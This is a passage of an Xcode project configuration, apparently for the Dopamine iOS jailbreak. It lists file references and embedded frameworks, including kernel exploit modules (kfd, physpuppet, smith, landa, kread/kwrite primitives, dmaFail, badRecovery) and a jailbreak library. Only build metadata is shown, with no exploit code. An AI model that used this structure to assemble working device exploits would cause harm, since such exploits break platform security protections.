		8CDD08482B4F6DF100A32B61 /* libxpf.dylib in Embed Libraries */ = {isa = PBXBuildFile; fileRef = 8CDD08442B4F6DD800A32B61 /* libxpf.dylib */; settings = {ATTRIBUTES = (CodeSignOnCopy, ); }; };
		8CDD08492B4F6DF500A32B61 /* libjailbreak.dylib in Embed Libraries */ = {isa = PBXBuildFile; fileRef = 8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */; settings = {ATTRIBUTES = (CodeSignOnCopy, ); }; };
		8CDD084A2B4F6DF800A32B61 /* libchoma.dylib in Embed Libraries */ = {isa = PBXBuildFile; fileRef = 8CDD08432B4F6DD800A32B61 /* libchoma.dylib */; settings = {ATTRIBUTES = (CodeSignOnCopy, ); }; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		8C05B0072B63152B001A7CF3 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C71980D2ABF0E82003C6658 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8C05B0022B63152B001A7CF3;
			remoteInfo = badRecovery;
		};
		8C2B1FE32B532374009BA166 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C71980D2ABF0E82003C6658 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8C2B1FDE2B532374009BA166;
			remoteInfo = dmaFail;
		};
		8C5FA8D82BDD36B6008C246F /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C71980D2ABF0E82003C6658 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8C5FA8D32BDD36B6008C246F;
			remoteInfo = weightBufs;
		};
		8C5FA8E82BDD36BF008C246F /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C71980D2ABF0E82003C6658 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8C5FA8E32BDD36BF008C246F;
			remoteInfo = multicast_bytecopy;
		};
		8CDD07AB2B4F619000A32B61 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C71980D2ABF0E82003C6658 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8CDD07A62B4F619000A32B61;
			remoteInfo = kfd;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		8C029F5C2B4E21F50071DE58 /* Embed Libraries */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 6;
			files = (
				8CDD084A2B4F6DF800A32B61 /* libchoma.dylib in Embed Libraries */,
				8CDD08492B4F6DF500A32B61 /* libjailbreak.dylib in Embed Libraries */,
				8CDD08482B4F6DF100A32B61 /* libxpf.dylib in Embed Libraries */,
			);
			name = "Embed Libraries";
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CDD07AE2B4F619000A32B61 /* Embed Frameworks */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 10;
			files = (
				8C5FA8DB2BDD36B6008C246F /* weightBufs.framework in Embed Frameworks */,
				8CDD07AF2B4F619000A32B61 /* kfd.framework in Embed Frameworks */,
				8C2B1FF42B53492B009BA166 /* dmaFail.framework in Embed Frameworks */,
				8C5FA8EB2BDD36BF008C246F /* multicast_bytecopy.framework in Embed Frameworks */,
				8C05B0152B631738001A7CF3 /* badRecovery.framework in Embed Frameworks */,
			);
			name = "Embed Frameworks";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		040622A82B77FE8E00393AAD /* DOPkgManagerPickerViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPkgManagerPickerViewController.h; sourceTree = "<group>"; };
		040622A92B77FE8E00393AAD /* DOPkgManagerPickerViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPkgManagerPickerViewController.m; sourceTree = "<group>"; };
		042479682B66916B0082581B /* DOJailbreakButton.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOJailbreakButton.h; sourceTree = "<group>"; };
		0424796B2B66916B0082581B /* DOCreditsViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOCreditsViewController.m; sourceTree = "<group>"; };
		0424796C2B66916B0082581B /* DOSettingsController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOSettingsController.m; sourceTree = "<group>"; };
		0424796D2B66916B0082581B /* DOPSListController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOPSListController.h; sourceTree = "<group>"; };
		0424796E2B66916B0082581B /* DOCreditsViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOCreditsViewController.h; sourceTree = "<group>"; };
		0424796F2B66916B0082581B /* Credits.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Credits.plist; sourceTree = "<group>"; };
		042479702B66916B0082581B /* DOSettingsController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOSettingsController.h; sourceTree = "<group>"; };
		042479722B66916B0082581B /* DOHeaderCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOHeaderCell.h; sourceTree = "<group>"; };
		042479732B66916B0082581B /* DOCreditsCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOCreditsCell.m; sourceTree = "<group>"; };
		042479742B66916B0082581B /* DOButtonCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOButtonCell.h; sourceTree = "<group>"; };
		042479752B66916B0082581B /* DOHeaderCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOHeaderCell.m; sourceTree = "<group>"; };
		042479762B66916B0082581B /* DOCreditsCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOCreditsCell.h; sourceTree = "<group>"; };
		042479772B66916B0082581B /* DOButtonCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOButtonCell.m; sourceTree = "<group>"; };
		042479782B66916B0082581B /* DOPSListController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOPSListController.m; sourceTree = "<group>"; };
		0424797A2B66916B0082581B /* DOModalTransitionPush.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOModalTransitionPush.h; sourceTree = "<group>"; };
		0424797B2B66916B0082581B /* DOModalTransitionScale.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOModalTransitionScale.h; sourceTree = "<group>"; };
		0424797C2B66916B0082581B /* DOModalBackAction.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOModalBackAction.m; sourceTree = "<group>"; };
		0424797D2B66916B0082581B /* DOModalTransitionPush.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOModalTransitionPush.m; sourceTree = "<group>"; };
		0424797E2B66916B0082581B /* DOModalTransitionScale.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOModalTransitionScale.m; sourceTree = "<group>"; };
		0424797F2B66916B0082581B /* DOModalBackAction.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOModalBackAction.h; sourceTree = "<group>"; };
		042479802B66916B0082581B /* DONavigationController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DONavigationController.h; sourceTree = "<group>"; };
		042479812B66916B0082581B /* DOUIManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOUIManager.h; sourceTree = "<group>"; };
		042479822B66916B0082581B /* DOHeaderView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOHeaderView.h; sourceTree = "<group>"; };
		042479832B66916B0082581B /* DOGlobalAppearance.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOGlobalAppearance.h; sourceTree = "<group>"; };
		042479842B66916B0082581B /* DOMainViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOMainViewController.h; sourceTree = "<group>"; };
		042479862B66916B0082581B /* DOJailbreakButton.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOJailbreakButton.m; sourceTree = "<group>"; };
		042479872B66916B0082581B /* DOHeaderView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOHeaderView.m; sourceTree = "<group>"; };
		042479882B66916B0082581B /* DOUIManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOUIManager.m; sourceTree = "<group>"; };
		042479892B66916B0082581B /* DONavigationController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DONavigationController.m; sourceTree = "<group>"; };
		0424798B2B66916B0082581B /* DOLyricsLogItemView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOLyricsLogItemView.h; sourceTree = "<group>"; };
		0424798D2B66916B0082581B /* DODoubleHelixIndicator.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DODoubleHelixIndicator.h; sourceTree = "<group>"; };
		0424798E2B66916B0082581B /* DOLoadingIndicator.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOLoadingIndicator.m; sourceTree = "<group>"; };
		0424798F2B66916B0082581B /* DOLoadingIndicator.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOLoadingIndicator.h; sourceTree = "<group>"; };
		042479902B66916B0082581B /* DODoubleHelixIndicator.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DODoubleHelixIndicator.m; sourceTree = "<group>"; };
		042479912B66916B0082581B /* DOProgressiveBlurView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOProgressiveBlurView.h; sourceTree = "<group>"; };
		042479922B66916B0082581B /* DODebugLogView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DODebugLogView.h; sourceTree = "<group>"; };
		042479932B66916B0082581B /* DOLogViewProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOLogViewProtocol.h; sourceTree = "<group>"; };
		042479942B66916B0082581B /* DOLyricsLogView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOLyricsLogView.m; sourceTree = "<group>"; };
		042479952B66916B0082581B /* DODebugLogView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DODebugLogView.m; sourceTree = "<group>"; };
		042479962B66916B0082581B /* DOProgressiveBlurView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOProgressiveBlurView.m; sourceTree = "<group>"; };
		042479972B66916B0082581B /* DOLyricsLogItemView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOLyricsLogItemView.m; sourceTree = "<group>"; };
		042479982B66916B0082581B /* DOLyricsLogView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOLyricsLogView.h; sourceTree = "<group>"; };
		0424799A2B66916B0082581B /* DOActionMenuButton.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOActionMenuButton.m; sourceTree = "<group>"; };
		0424799B2B66916B0082581B /* DOActionMenuView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOActionMenuView.h; sourceTree = "<group>"; };
		0424799C2B66916B0082581B /* DOActionMenuButton.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOActionMenuButton.h; sourceTree = "<group>"; };
		0424799D2B66916B0082581B /* DOActionMenuView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOActionMenuView.m; sourceTree = "<group>"; };
		0424799E2B66916B0082581B /* DOActionMenuDelegate.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOActionMenuDelegate.h; sourceTree = "<group>"; };
		0424799F2B66916B0082581B /* DOMainViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOMainViewController.m; sourceTree = "<group>"; };
		042479A02B66916B0082581B /* DOGlobalAppearance.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOGlobalAppearance.m; sourceTree = "<group>"; };
		042479E42B66B0DD0082581B /* Preferences.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Preferences.framework; path = Frameworks/Preferences.framework; sourceTree = "<group>"; };
		0443A9AF2B79D9C10014C933 /* DOPSListItemsController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPSListItemsController.m; sourceTree = "<group>"; };
		0443A9B02B79D9C10014C933 /* DOPSListItemsController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPSListItemsController.h; sourceTree = "<group>"; };
		049D52042B7E7C1D00389436 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52052B7E7C2500389436 /* da */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = da; path = da.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52062B7E7C3500389436 /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52072B7E7C4700389436 /* el */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = el; path = el.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52082B7E7C6B00389436 /* fil */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = fil; path = fil.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52092B7E7C7600389436 /* it */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = it; path = it.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520A2B7E7C8F00389436 /* ja */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ja; path = ja.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520B2B7E7CCA00389436 /* kk */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = kk; path = kk.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520C2B7E7CD300389436 /* ko */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ko; path = ko.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520D2B7E7D3500389436 /* nl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = nl; path = nl.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520E2B7E7D3E00389436 /* pl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = pl; path = pl.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D520F2B7E7D4700389436 /* pt-BR */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "pt-BR"; path = "pt-BR.lproj/Localizable.strings"; sourceTree = "<group>"; };
		049D52102B7E7D4F00389436 /* ru */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ru; path = ru.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52112B7E7D5700389436 /* sv */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = sv; path = sv.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52122B7E7D6200389436 /* tr */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = tr; path = tr.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52132B7E7D7000389436 /* uk */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = uk; path = uk.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52142B7E7D7B00389436 /* ur */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ur; path = ur.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52152B7E7D8200389436 /* vi */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = vi; path = vi.lproj/Localizable.strings; sourceTree = "<group>"; };
		049D52192B7E7E1600389436 /* zh-HK */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-HK"; path = "zh-HK.lproj/Localizable.strings"; sourceTree = "<group>"; };
		049D521C2B7E7EB300389436 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-Hans"; path = "zh-Hans.lproj/Localizable.strings"; sourceTree = "<group>"; };
		049D521D2B7E7EDA00389436 /* zh-TW */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-TW"; path = "zh-TW.lproj/Localizable.strings"; sourceTree = "<group>"; };
		049D521E2B7E7F1C00389436 /* zh-CN */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-CN"; path = "zh-CN.lproj/Localizable.strings"; sourceTree = "<group>"; };
		04C246982B73220400E17924 /* DOUpdateViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOUpdateViewController.m; sourceTree = "<group>"; };
		04C246992B73220400E17924 /* DOUpdateCircleView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DOUpdateCircleView.m; sourceTree = "<group>"; };
		04C2469A2B73220400E17924 /* DOUpdateCircleView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOUpdateCircleView.h; sourceTree = "<group>"; };
		04C2469B2B73220400E17924 /* DOUpdateViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DOUpdateViewController.h; sourceTree = "<group>"; };
		04C2469F2B73225800E17924 /* DODownloadViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DODownloadViewController.h; sourceTree = "<group>"; };
		04C246A02B73225800E17924 /* DODownloadViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DODownloadViewController.m; sourceTree = "<group>"; };
		04C246AC2B74ACA200E17924 /* DOAppSwitch.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOAppSwitch.h; sourceTree = "<group>"; };
		04C246AD2B74ACA200E17924 /* DOAppSwitch.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOAppSwitch.m; sourceTree = "<group>"; };
		04C246AF2B74B05800E17924 /* DOPkgManagerPickerView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPkgManagerPickerView.h; sourceTree = "<group>"; };
		04C246B02B74B05800E17924 /* DOPkgManagerPickerView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPkgManagerPickerView.m; sourceTree = "<group>"; };
		04C246B22B74B65900E17924 /* PkgManagers.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = PkgManagers.plist; sourceTree = "<group>"; };
		04DD0B332B7BA38C0055DE4F /* DOLicenseViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOLicenseViewController.h; sourceTree = "<group>"; };
		04DD0B342B7BA38C0055DE4F /* DOLicenseViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOLicenseViewController.m; sourceTree = "<group>"; };
		04DD0B362B7BA6180055DE4F /* LICENSE.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = LICENSE.md; sourceTree = "<group>"; };
		04DD0B392B7BF3E80055DE4F /* LICENSE_libc.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_libc.md; sourceTree = "<group>"; };
		04DD0B3B2B7C88210055DE4F /* DOLogCrashViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOLogCrashViewController.h; sourceTree = "<group>"; };
		04DD0B3C2B7C88210055DE4F /* DOLogCrashViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOLogCrashViewController.m; sourceTree = "<group>"; };
		04DD0B3F2B7CBD3D0055DE4F /* Themes.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Themes.plist; sourceTree = "<group>"; };
		04DD0B422B7CBE2E0055DE4F /* DOThemeManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOThemeManager.h; sourceTree = "<group>"; };
		04DD0B432B7CBE2E0055DE4F /* DOThemeManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOThemeManager.m; sourceTree = "<group>"; };
		04DD0B452B7CBEEA0055DE4F /* DOTheme.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOTheme.h; sourceTree = "<group>"; };
		04DD0B462B7CBEEA0055DE4F /* DOTheme.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOTheme.m; sourceTree = "<group>"; };
		04DD0B5A2B7D19E60055DE4F /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		04DD0B5C2B7D1A210055DE4F /* fr */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = fr; path = fr.lproj/Localizable.strings; sourceTree = "<group>"; };
		04DD0B5D2B7D1A210055DE4F /* es */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = es; path = es.lproj/Localizable.strings; sourceTree = "<group>"; };
		51AB98D92BBF44390042EA7B /* libpartial.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libpartial.a; path = Dopamine/Dependencies/libpartial.a; sourceTree = "<group>"; };
		8C029F412B4DFD5D0071DE58 /* DOExploitManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOExploitManager.h; sourceTree = "<group>"; };
		8C029F422B4DFD5D0071DE58 /* DOExploitManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOExploitManager.m; sourceTree = "<group>"; };
		8C029F442B4DFD910071DE58 /* DOBootstrapper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOBootstrapper.h; sourceTree = "<group>"; };
		8C029F452B4DFD910071DE58 /* DOBootstrapper.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOBootstrapper.m; sourceTree = "<group>"; };
		8C029F4C2B4E1FF30071DE58 /* DOExploit.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOExploit.h; sourceTree = "<group>"; };
		8C029F4D2B4E1FF30071DE58 /* DOExploit.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOExploit.m; sourceTree = "<group>"; };
		8C029F5E2B4E25350071DE58 /* DOEnvironmentManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOEnvironmentManager.h; sourceTree = "<group>"; };
		8C029F5F2B4E25350071DE58 /* DOEnvironmentManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOEnvironmentManager.m; sourceTree = "<group>"; };
		8C029F612B4E2E140071DE58 /* DOJailbreaker.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOJailbreaker.h; sourceTree = "<group>"; };
		8C029F622B4E2E140071DE58 /* DOJailbreaker.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOJailbreaker.m; sourceTree = "<group>"; };
		8C029F652B4E2E7D0071DE58 /* libcompression.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libcompression.tbd; path = usr/lib/libcompression.tbd; sourceTree = SDKROOT; };
		8C029F672B4E31D50071DE58 /* libMobileGestalt.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libMobileGestalt.tbd; path = usr/lib/libMobileGestalt.tbd; sourceTree = SDKROOT; };
		8C029F6A2B4E320E0071DE58 /* libz.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libz.tbd; path = usr/lib/libz.tbd; sourceTree = SDKROOT; };
		8C05B0032B63152B001A7CF3 /* badRecovery.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = badRecovery.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8C05B0132B6315DB001A7CF3 /* badRecovery.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = badRecovery.m; sourceTree = "<group>"; };
		8C05B0162B6319D7001A7CF3 /* badRecovery.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = badRecovery.h; sourceTree = "<group>"; };
		8C05B0172B632925001A7CF3 /* badRecovery.s */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.asm; path = badRecovery.s; sourceTree = "<group>"; };
		8C05C59D2B759F8A0097A931 /* bootstrap_1900.tar.zst */ = {isa = PBXFileReference; lastKnownFileType = file; path = bootstrap_1900.tar.zst; sourceTree = "<group>"; };
		8C05C59E2B759F8A0097A931 /* bootstrap_1800.tar.zst */ = {isa = PBXFileReference; lastKnownFileType = file; path = bootstrap_1800.tar.zst; sourceTree = "<group>"; };
		8C1FC8422B6460FD00282536 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8C2131782B50CA4B008E682C /* krkw.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = krkw.h; sourceTree = "<group>"; };
		8C21317B2B50CA4B008E682C /* kread_sem_open.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kread_sem_open.h; sourceTree = "<group>"; };
		8C21317C2B50CA4B008E682C /* kread_IOSurface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kread_IOSurface.h; sourceTree = "<group>"; };
		8C21317D2B50CA4B008E682C /* kread_kqueue_workloop_ctl.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kread_kqueue_workloop_ctl.h; sourceTree = "<group>"; };
		8C21317E2B50CA4B008E682C /* IOSurface_shared.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = IOSurface_shared.h; sourceTree = "<group>"; };
		8C2131802B50CA4B008E682C /* kwrite_IOSurface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kwrite_IOSurface.h; sourceTree = "<group>"; };
		8C2131812B50CA4B008E682C /* kwrite_sem_open.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kwrite_sem_open.h; sourceTree = "<group>"; };
		8C2131822B50CA4B008E682C /* kwrite_dup.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kwrite_dup.h; sourceTree = "<group>"; };
		8C2131842B50CA4B008E682C /* static_info.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = static_info.h; sourceTree = "<group>"; };
		8C2131872B50CA4B008E682C /* dynamic_info.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = dynamic_info.h; sourceTree = "<group>"; };
		8C2131882B50CA4B008E682C /* puaf.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = puaf.h; sourceTree = "<group>"; };
		8C2131892B50CA4B008E682C /* common.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = common.h; sourceTree = "<group>"; };
		8C21318B2B50CA4B008E682C /* smith.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = smith.h; sourceTree = "<group>"; };
		8C21318C2B50CA4B008E682C /* physpuppet.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = physpuppet.h; sourceTree = "<group>"; };
		8C21318D2B50CA4B008E682C /* landa.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = landa.h; sourceTree = "<group>"; };
		8C21318E2B50CA4B008E682C /* perf.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = perf.h; sourceTree = "<group>"; };
		8C21318F2B50CA4B008E682C /* info.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = info.h; sourceTree = "<group>"; };
